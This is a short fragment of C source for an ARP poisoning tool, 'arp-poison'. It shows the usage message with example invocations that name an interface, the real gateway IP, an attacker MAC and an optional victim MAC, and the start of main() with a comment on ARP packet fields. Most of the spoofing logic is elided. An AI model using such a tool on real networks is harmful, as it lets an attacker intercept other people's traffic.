...
usage()
{
  puts("usage:\t./arp-poison <interface> <real gw ip> <attack gw mac addr> (<victim mac>)");
  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff aa:bb:cc:aa:bb:cc");
  exit(1);
}
...
main(int argc, char ** argv)
{
  ...
  // ARP target/dest protocol info doesn't actually matter
  // here (ether determines if we bcast or send only to victim)
  // but I'll be clean and set to something sensible
  if (argc <= 4) {
